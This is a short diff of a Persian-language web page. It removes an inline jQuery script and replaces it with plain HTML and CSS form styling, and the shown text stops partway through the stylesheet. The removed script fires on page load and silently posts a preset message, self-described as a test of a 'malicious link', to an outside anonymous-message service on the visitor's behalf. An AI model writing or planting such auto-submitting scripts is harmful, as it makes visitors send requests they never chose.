@@ -1,17 +1,28 @@
-<script>
-        var id = "16965075642233";
-        function sendMsg() {
-            var text = "سلام من یک تست جاوا اسکریپت برای تبدیل به لینک مخرب شدنم"
-            $.post("https://harfeto.timefriend.net/harfeto/sendMsg", {text: text,id:id},function(result,status){
-                if(status=='success'){
-                    var obj = JSON.parse(result);
-                    if(obj.id!='0'){
-                        $('.hide').replaceWith('<p  style="font-size: 20px;color: #00ff15;direction: rtl;">پیام شما با موفقیت ارسال شد.</p>');
-                    }else{
-                        alert('اشکال در ارتباط با سرور');
-                    }
-                }
-            });
-        }
-        sendMsg()
-                   </script>
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+​
+*{
+ box-sizing: border-box;
+}
+​
+body{
+ background-color:#f2f2f2;
+ direction:rtl;
+ font-family:tahoma;
+}
+​
+input[type=text]{
+ width: 100%;
+ padding: 12px;
+ border: 1px solid #ccc;
+ border-radius: 4px;
+ resize: vertical;
+ font-family:tahoma;
+ font-size:13px;
+}
+​
+label{
+ padding: 12px 12px 12px 0;
+ display: inline-block;
